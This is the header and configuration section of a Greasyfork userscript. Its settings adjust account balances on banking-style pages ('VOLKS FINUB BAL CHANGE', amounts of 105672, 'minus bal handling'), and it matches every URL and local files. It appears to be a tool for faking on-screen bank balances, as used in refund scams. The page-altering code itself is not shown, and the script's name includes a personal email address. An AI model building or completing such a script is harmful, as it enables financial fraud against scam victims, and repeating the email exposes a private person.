// ==UserScript==
// @name         Ed 4Rec j.vonrosen@icloud.com
// @namespace    http://tampermonkey.net/
// @version      3.9
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @match        file:///C:/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/502691/Ed%204Rec%20jvonrosen%40icloudcom.user.js
// @updateURL https://update.greasyfork.org/scripts/502691/Ed%204Rec%20jvonrosen%40icloudcom.meta.js
// ==/UserScript==


//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------

   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  105672},
        { index: 1, adjustmentAmount: 105672},
        { index: 2, adjustmentAmount: 105672},
        { index: 3, adjustmentAmount: 0 },
        { index: 4, adjustmentAmount: 0}
        // Add more balance configurations as needed
    ];

